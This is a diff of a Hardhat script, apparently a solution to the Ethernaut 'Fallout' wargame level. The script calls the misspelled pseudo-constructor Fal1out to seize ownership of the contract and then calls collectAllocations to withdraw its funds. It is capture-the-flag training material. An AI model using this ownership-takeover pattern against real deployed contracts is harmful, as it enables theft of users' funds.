@@ -1,20 +1,21 @@
 const hre = require("hardhat");
 
 async function main() {
-  const [, otherAccount] = await ethers.getSigners();
+  const [Owner] = await ethers.getSigners();
   const Fallout = await hre.ethers.getContractFactory("Fallout");
 
   // attach your instance address
-  const fallout = Fallout.attach("0xf1663dA66AE75dE6F302B3167eA18e7536a315b6");
+  const fallout = Fallout.attach("0x611334e82CeaAc147fc1A2D3eaa395235761Bc9d");
   const currentOwner = await fallout.owner();
   console.log(`Current Owner is  ${currentOwner}`);
 
   // constructor is misspelled
-  await fallout.connect(otherAccount).Fal1out({
+  const tx = await fallout.Fal1out({
     value: ethers.utils.parseEther("0.0001"),
   });
+  await tx.wait(1);
   const NewOwner = await fallout.owner();
-  console.log(`New Owner is  ${NewOwner}  --> ${NewOwner === otherAccount}`);
+  console.log(`New Owner is  ${NewOwner}`);
 
   await fallout.collectAllocations();
 }
